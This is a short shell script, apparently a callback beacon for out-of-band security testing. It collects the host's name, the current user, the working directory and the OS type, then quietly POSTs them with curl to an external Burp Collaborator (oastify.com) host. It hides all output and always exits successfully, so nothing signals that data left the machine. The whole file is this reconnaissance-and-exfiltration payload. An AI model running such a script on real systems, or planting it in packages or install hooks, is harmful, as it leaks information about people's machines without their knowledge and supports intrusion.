#!/bin/sh
umask 077
BURP="http://u4zko5vt6eqa9nlixp5lyd1wonueib60.oastify.com/"
DATA="host=$(/bin/hostname 2>/dev/null)&user=$(/usr/bin/id -un 2>/dev/null)&pwd=$(/bin/pwd 2>/dev/null)&os=$(/usr/bin/uname -s 2>/dev/null)"
/usr/bin/curl -sS -m 8 -X POST "$BURP" --data "$DATA" >/dev/null 2>&1
exit 0
